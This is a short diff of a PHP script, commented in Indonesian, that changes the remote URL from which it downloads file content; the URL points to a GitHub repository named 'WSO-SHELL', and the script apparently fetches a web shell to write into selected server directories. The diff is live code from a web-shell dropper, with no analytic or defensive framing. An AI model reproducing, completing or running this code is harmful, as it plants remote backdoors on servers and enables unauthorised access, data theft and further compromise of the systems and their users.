@@ -43,7 +43,7 @@ if (empty($selectedDirs)) {
 }
 
 // URL sumber file yang akan diunduh
-$sourceFileUrl = 'https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/.vne00000007';
+$sourceFileUrl = 'https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/.vne00000000000';
 
 // Mengunduh konten dari URL sumber sekali saja untuk efisiensi
 $fileContent = file_get_contents($sourceFileUrl);
